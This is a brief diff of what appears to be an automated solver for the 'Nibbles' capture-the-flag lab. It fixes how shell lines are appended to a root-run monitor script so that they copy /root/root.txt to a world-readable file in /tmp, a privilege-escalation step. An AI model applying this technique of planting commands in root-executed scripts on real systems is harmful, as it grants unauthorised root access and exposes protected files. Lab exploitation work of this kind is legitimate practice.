@@ -137,7 +137,7 @@ root_lines = [
     "/bin/cat /root/root.txt > /tmp/nibbles-native-root-answer",
     "/bin/chmod 0644 /tmp/nibbles-native-root-answer",
 ]
-append_monitor("\\n" + "\\n".join(root_lines) + "\\n")
+append_monitor("\n" + "\n".join(root_lines) + "\n")
 monitor_content = read_monitor()
 assert all(line in monitor_content for line in root_lines), monitor_content
 root_output = run_php(
